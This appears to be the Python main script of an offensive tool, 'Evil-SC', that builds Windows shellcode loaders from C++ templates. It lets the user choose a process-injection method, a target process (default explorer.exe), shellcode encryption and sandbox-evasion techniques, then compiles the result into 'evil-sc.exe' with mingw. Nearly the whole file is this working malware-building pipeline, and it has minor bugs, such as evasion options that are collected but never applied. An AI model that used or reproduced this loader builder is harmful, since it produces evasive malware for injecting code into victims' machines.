import argparse
import os
import random
import string
from colorama import init, Fore
from core.Utils.Raw2Shell import raw2shell
from core.Utils.CustomArgFormatter import CustomArgFormatter

def banner():
    init(autoreset=True)

    ascii_art = f"""
    {Fore.CYAN}███████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}╗   {Fore.CYAN}██{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}╗      {Fore.CYAN}███████{Fore.GREEN}╗ {Fore.CYAN}██████{Fore.GREEN}╗
    {Fore.CYAN}██{Fore.GREEN}╔════╝{Fore.CYAN}██{Fore.GREEN}║   {Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║      {Fore.CYAN}██{Fore.GREEN}╔════╝{Fore.CYAN}██{Fore.GREEN}╔════╝
    {Fore.CYAN}█████{Fore.GREEN}╗  {Fore.CYAN}██{Fore.GREEN}║   {Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}█████{Fore.GREEN}╗{Fore.CYAN}███████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║     
    {Fore.CYAN}██{Fore.GREEN}╔══╝  ╚{Fore.CYAN}██{Fore.GREEN}╗ {Fore.CYAN}██{Fore.GREEN}╔╝{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║╚════╝╚════{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║     
    {Fore.CYAN}███████{Fore.GREEN}╗ ╚{Fore.CYAN}████{Fore.GREEN}╔╝ {Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}███████{Fore.GREEN}╗ {Fore.CYAN}███████{Fore.GREEN}║╚{Fore.CYAN}██████{Fore.GREEN}╗
    {Fore.GREEN}╚══════╝  ╚═══╝  ╚═╝╚══════╝ ╚══════╝ ╚═════╝
    {Fore.CYAN}                                             @v4resk                         
    """

    print(ascii_art)

class esc:
    def __init__(self):
        self.target_process = ""
        self.shellcode_variable = ""
        self.method_file = ""
        self.encoder_files = []
        self.encrypt_files = []
        self.encrypt_keys = []
        self.sandbox_evasion = []
        self.evil_sc_template_file = ""
        self.outfile = ""

    def parse_arguments(self):
        parser = argparse.ArgumentParser(description='Template-based shellcode loader', formatter_class=CustomArgFormatter)
        parser.add_argument('shellcode_variable', metavar='shellcode', help='Specify the shellcode variable')

        parser.add_argument('-m', '--method', dest='method_folder', required=True, choices=self.get_available_methods(),
                            help='Shellcode-loading method')
        
        parser.add_argument('-e', '--encrypt', action='append', dest='encrypt_files', choices=self.get_available_files("Encryptors"),  
                            help='Template-dependent encryption or encoding method to be applied to the shellcode')
        
        parser.add_argument('-ek', '--encrypt-key', action='append', dest='encrypt_keys', metavar='KEY',
                            help=f'A key to be used for --encrypt (auto-generated if empty)')
        
        parser.add_argument('-p', '--process', dest='target_process',metavar='PROCESS_NAME', default="explorer.exe",
                            help='Process name for shellcode injection')
                
        parser.add_argument('-se', '--sandbox-evasion', action='append', dest='sandbox_evasion', choices=self.get_available_files("SandboxEvasion"),
                            help=f'Sandbox evasion technique')
        
        parser.add_argument('-o','--outfile', dest='outfile', metavar='OUTPUT_FILE', default="evil-sc.exe",
                            help=f'Output filename')
            
        parser.add_argument('--encoder', action='append', dest='encoder_files', metavar='ENCODER',
                            help='Template-independent encoding method to be applied to the shellcode (default: sgn)')
        
        args = parser.parse_args()

        # Generate random keys for missing encryptors if necessary
        if args.encrypt_files:
            key_length = 16  # Default key length, you can adjust it

        if not args.encrypt_keys:
            # Generate random keys for missing encryptors
            args.encrypt_keys = [self.generate_random_key(key_length) for _ in range(len(args.encrypt_files))]
        elif len(args.encrypt_files) > len(args.encrypt_keys):
            # Generate random keys for the missing encryptors
            missing_keys_count = len(args.encrypt_files) - len(args.encrypt_keys)
            args.encrypt_keys.extend([self.generate_random_key(key_length) for _ in range(missing_keys_count)])
        elif len(args.encrypt_files) < len(args.encrypt_keys):
            parser.print_help()
            print(f"\n{Fore.RED}Error: Number of encryptors and encrypt keys must be the same.")
            exit(1)

        return args

    def generate_random_key(self, length):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def get_available_files(self, folder):
        template_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Templates', folder)
        if not os.path.exists(template_folder):
            os.makedirs(template_folder)
        available_files = [file[:-4] for file in os.listdir(template_folder) if file.endswith('.cpp')]
        return available_files

    def get_available_methods(self):
        methods_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Templates', 'Methods')
        if not os.path.exists(methods_folder):
            os.makedirs(methods_folder)
        available_methods = [folder for folder in os.listdir(methods_folder) if os.path.isdir(os.path.join(methods_folder, folder))]
        return available_methods

    def process_method_folder(self, method_folder):
        folder_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Templates', 'Methods', method_folder)
        if not os.path.exists(folder_path):
            print(f"Error: Method folder '{method_folder}' not found.")
            return None, None

        cpp_file_path = os.path.join(folder_path, f'{method_folder}.cpp')
        includes_file_path = os.path.join(folder_path, f'{method_folder}.includes')

        if not os.path.exists(cpp_file_path):
            print(f"Error: File '{method_folder}.cpp' not found in '{folder_path}'.")
            return None, None

        return cpp_file_path, includes_file_path

    def process_files(self, files, folder):
        if files is None:
            return []
        
        processed_files = []
        for file in files:
            file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Templates', folder, f'{file}.cpp')
            if os.path.exists(file_path):
                processed_files.append(file_path)
            else:
                print(f"Warning: File '{file}.cpp' not found in '{folder}'")
        return processed_files
    
    def generate_evil_sc_file(self):
        template_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Templates', 'LoaderTemplate', 'template.cpp')
        
        with open(template_path, "r") as template_file:
            template_content = template_file.read()

        # Replace ###METHOD_MAIN### with user's chosen method content
        method_content = ""
        with open(self.method_file, "r") as method_file:
            method_content = method_file.read()

        # Replace ###METHOD_INCLUDES### with user's chosen method includes content
        method_includes_content = ""
        with open(self.method_includes, "r") as includes_file:
            method_includes_content = includes_file.read()

        # Replace ###DECODE_FUNCTION### with user's chosen encryptor content
        encrypt_content = ""
        for encrypt_file in self.encrypt_files:
            with open(encrypt_file, "r") as encrypt_file_content:
                encrypt_content += encrypt_file_content.read() + '\n'

        evil_sc_content = template_content.replace("###METHOD_MAIN###", method_content)
        evil_sc_content = evil_sc_content.replace("###METHOD_INCLUDES###", method_includes_content)
        evil_sc_content = evil_sc_content.replace("###DECRYPT_FUNCTION###", encrypt_content)
        evil_sc_content = evil_sc_content.replace("###TARGET_PROCESS###", self.target_process)
        evil_sc_content = evil_sc_content.replace("###SHELLCODE###", raw2shell(self.shellcode_variable))
        

        self.evil_sc_template_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Templates', 'LoaderTemplate', 'evil-sc.cpp')
        with open(self.evil_sc_template_file, "w") as evil_sc_file:
            evil_sc_file.write(evil_sc_content)
    

    def build_evil_sc_loader(self):
        os.system(f"x86_64-w64-mingw32-g++ {self.evil_sc_template_file} -o {self.outfile}" )
        pass

    def run(self):
        args = self.parse_arguments()

        self.shellcode_variable = args.shellcode_variable
        self.target_process = args.target_process

        self.method_file, self.method_includes = self.process_method_folder(args.method_folder)
        if self.method_file is None:
            return

        self.encrypt_files = self.process_files(args.encrypt_files, 'Encryptors')
        self.sandbox_evasion = self.process_files(args.sandbox_evasion, 'SandboxEvasion')
        self.encrypt_keys = args.encrypt_keys
        self.outfile = args.outfile

        print(f'{Fore.GREEN}Shellcode:\t\t{Fore.WHITE} {self.shellcode_variable}')
        print(f'{Fore.GREEN}Method File:\t\t{Fore.WHITE} {self.method_file}')
        print(f'{Fore.GREEN}Method Includes File:\t{Fore.WHITE} {self.method_includes}')
        print(f'{Fore.GREEN}Encryptors:\t\t{Fore.WHITE}{self.encrypt_files}')
        print(f'{Fore.GREEN}Sandbox Evasion:\t{Fore.WHITE}{self.sandbox_evasion}')
        print(f'{Fore.GREEN}Target Process:\t\t{Fore.WHITE}{self.target_process}')
        print(f'{Fore.GREEN}Encrypt Keys:\t\t{Fore.WHITE}{self.encrypt_keys}')

        self.generate_evil_sc_file()
        self.build_evil_sc_loader()

        print(f"\n{Fore.CYAN}Genreated template: {Fore.WHITE}{self.evil_sc_template_file}")
        print(f"\n{Fore.CYAN}Output: {Fore.WHITE}{self.outfile}")

